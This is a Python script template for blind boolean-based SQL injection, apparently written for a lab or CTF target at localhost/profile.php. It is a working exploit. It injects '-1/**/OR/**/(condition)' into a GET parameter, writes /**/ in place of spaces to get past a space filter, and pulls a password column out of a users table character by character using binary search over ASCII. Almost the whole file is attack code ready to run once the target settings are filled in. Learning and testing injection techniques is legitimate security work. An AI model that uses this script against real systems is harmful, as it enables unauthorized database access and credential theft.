#!/usr/bin/env python3
"""
Blind Boolean-Based SQLi Extraction Script (Template)
======================================================
Use when: SQL injection is confirmed but no data is returned inline.
          The page shows different content based on a boolean condition.

Requirements:
  - Python 3 + requests (pip install requests)
  - A valid session cookie (PHPSESSID or equivalent)
  - Known injection point (GET parameter)
  - Known HTML marker string that appears/disappears based on condition

Usage:
  1. Set URL, SESSION_COOKIE, COOKIE_NAME, INJECT_PARAM, MARKER, MARKER_POLARITY,
     TARGET_TABLE, TARGET_COLUMN, TARGET_ROW_ID, EXTRA_PARAMS
  2. python blind_boolean_extract.py

How it works:
  - Injects: <INJECT_PARAM>=-1/**/OR/**/(condition)
  - If condition is TRUE  → query returns rows → marker behavior depends on MARKER_POLARITY
  - If condition is FALSE → query returns 0 rows → opposite marker behavior
  - Extracts data char-by-char using binary search on ASCII range (fast)

Marker polarity:
  - "absent_true": marker is ABSENT when condition is TRUE  (e.g., "Follow" button only shows on 0 rows)
  - "present_true": marker is PRESENT when condition is TRUE (e.g., "Followed" badge shows when row exists)

  Always sanity-check: 1=1 should return True, 1=2 should return False.
  If inverted, flip MARKER_POLARITY.

Notes:
  - Space filter bypass: uses /**/ instead of spaces (bypasses strpos($input, ' ') filter)
  - Binary search on ASCII 32-126: ~7 requests per char (vs ~75 for linear)
  - Add time.sleep(0.1) between requests if the server rate-limits
"""

import sys

try:
    import requests
except ImportError:
    print("[-] pip install requests")
    sys.exit(1)

# ==================== CONFIG ====================
URL = "http://localhost/profile.php"
SESSION_COOKIE = "YOUR_PHPSESSID_HERE"
COOKIE_NAME = "PHPSESSID"
INJECT_PARAM = "receiver_id"         # GET parameter that is injectable
EXTRA_PARAMS = {"user_id": "14"}     # other required GET params (e.g., user_id)

# Marker: the HTML string that appears/disappears based on condition
MARKER = "Followed"                  # e.g., "Followed" badge, "follow_user" button name, etc.

# Marker polarity:
#   "absent_true"   → marker ABSENT when condition TRUE  (check returns True if marker NOT in response)
#   "present_true"  → marker PRESENT when condition TRUE  (check returns True if marker IS in response)
MARKER_POLARITY = "present_true"

TARGET_TABLE = "users"
TARGET_COLUMN = "backup_password"    # Column to extract
TARGET_ROW_ID = 1                    # Row ID to target
# ================================================


def check(condition):
    """
    Send blind boolean payload. Returns True if condition is TRUE.

    Payload: <INJECT_PARAM>=-1/**/OR/**/(condition)

    Logic (second-operand AND injection):
      Original query: WHERE sender_id=X AND receiver_id=<payload>
      Injected:       WHERE sender_id=X AND receiver_id=-1 OR (condition)
      SQL precedence: (sender_id=X AND receiver_id=-1) OR (condition)
      First clause always false → result depends entirely on condition.

      condition TRUE  → rows returned → marker behavior depends on MARKER_POLARITY
      condition FALSE → 0 rows       → opposite marker behavior

    Space bypass: all spaces replaced with /**/ to bypass strpos($input, ' ') filter.
    """
    payload = "-1/**/OR/**/(" + condition + ")"

    params = dict(EXTRA_PARAMS)
    params[INJECT_PARAM] = payload

    r = requests.get(
        URL,
        params=params,
        cookies={COOKIE_NAME: SESSION_COOKIE},
    )

    if MARKER_POLARITY == "present_true":
        return MARKER in r.text
    else:
        return MARKER not in r.text


def get_length():
    """Find length of target value by testing LENGTH()=1, 2, 3, ..."""
    for n in range(1, 200):
        cond = (
            "SELECT/**/LENGTH(" + TARGET_COLUMN + ")"
            "/**/FROM/**/" + TARGET_TABLE +
            "/**/WHERE/**/id=" + str(TARGET_ROW_ID)
        )
        if check("(" + cond + ")=" + str(n)):
            return n
    return 0


def get_char(pos):
    """Extract char at position pos using binary search on ASCII range (fast)."""
    low, high = 32, 126  # printable ASCII range
    while low < high:
        mid = (low + high) // 2
        cond = (
            "SELECT/**/ASCII(SUBSTRING(" + TARGET_COLUMN + "," + str(pos) + ",1))"
            "/**/FROM/**/" + TARGET_TABLE +
            "/**/WHERE/**/id=" + str(TARGET_ROW_ID)
        )
        if check("(" + cond + ")>" + str(mid)):
            low = mid + 1
        else:
            high = mid
    return chr(low)


def main():
    print("=" * 55)
    print("  Blind Boolean SQLi - Extract " + TARGET_COLUMN)
    print("=" * 55)
    print("  URL      :", URL)
    print("  Param    :", INJECT_PARAM)
    print("  Table    :", TARGET_TABLE)
    print("  Column   :", TARGET_COLUMN)
    print("  Row ID   :", TARGET_ROW_ID)
    print("  Marker   :", MARKER, "(" + MARKER_POLARITY + ")")
    print("=" * 55)
    print()

    # Sanity check
    print("[*] Sanity check...")
    if not check("1=1"):
        print("[!] FAIL: 1=1 returned False (expected True)")
        print("[!] Check: URL, cookie, marker string, marker polarity, injection point")
        return
    if check("1=2"):
        print("[!] FAIL: 1=2 returned True (expected False)")
        print("[!] Try flipping MARKER_POLARITY (absent_true <-> present_true)")
        return
    print("[+] Injection confirmed (1=1=True, 1=2=False)")
    print()

    # Get length
    print("[*] Finding length of " + TARGET_COLUMN + "...")
    length = get_length()
    if length == 0:
        print("[!] Length is 0 — column may be NULL or empty")
        return
    print("[+] Length:", length)
    print()

    # Extract
    print("[*] Extracting (binary search, ASCII 32-126)...")
    print()
    result = ""
    for i in range(1, length + 1):
        c = get_char(i)
        result += c
        pct = int(i / length * 100)
        bar = "#" * (pct // 5) + "-" * (20 - pct // 5)
        print("  [" + str(i) + "/" + str(length) + "] " + bar + " " + str(pct).rjust(3) + "%  =>  " + result)

    print()
    print("=" * 55)
    print("  RESULT: " + TARGET_COLUMN + " = " + result)
    print("=" * 55)


if __name__ == "__main__":
    main()
